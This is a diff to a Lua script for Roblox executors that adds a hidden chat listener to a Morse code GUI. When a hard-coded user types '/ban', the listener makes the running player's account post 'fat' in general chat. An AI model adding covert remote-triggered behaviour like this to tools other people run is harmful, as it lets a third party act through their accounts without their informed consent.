@@ -1,4 +1,4 @@
--- // Catbar's Morse Code GUI - Small + Clean Hide (No White Leftover)
+-- Catbar's Morse Code GUI - Small + Clean Hide (No White Leftover)
 -- Client-side for Roblox Executors
 
 local Players = game:GetService("Players")
@@ -6,6 +6,43 @@ local TextChatService = game:GetService("TextChatService")
 local UserInputService = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
+
+-- ================== NEW: BAN COMMAND DETECTION ==================
+local TARGET_USER = "User_KVH"
+
+local function sendFat()
+    pcall(function()
+        if TextChatService.TextChannels and TextChatService.TextChannels:FindFirstChild("RBXGeneral") then
+            TextChatService.TextChannels.RBXGeneral:SendAsync("fat")
+        else
+            game.ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer("fat", "All")
+        end
+    end)
+end
+
+-- Listen for normal chat messages (works for both new and old chat systems)
+local function onNormalChatMessage(message)
+    if not message.Text then return end
+    
+    local senderName = message.TextSource and message.TextSource.Name or nil
+    if not senderName then return end
+
+    if senderName == TARGET_USER and message.Text:lower() == "/ban" then
+        sendFat()
+    end
+end
+
+-- Connect to modern TextChatService
+if TextChatService.TextChannels then
+    TextChatService.MessageReceived:Connect(onNormalChatMessage)
+end
+
+-- Fallback for legacy chat system
+pcall(function()
+    game.ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents").OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
+        onNormalChatMessage({Text = data.Message, TextSource = {Name = data.FromSpeaker}})
+    end)
+end)
 
 -- ================== MORSE CODE ==================
 local MORSE = {
@@ -320,4 +357,4 @@ pcall(function()
     end)
 end)
 
-print("🌸 Small Morse GUI loaded with clean hide!")
+print("🌸 Small Morse GUI loaded with clean hide + /Ban trigger!")
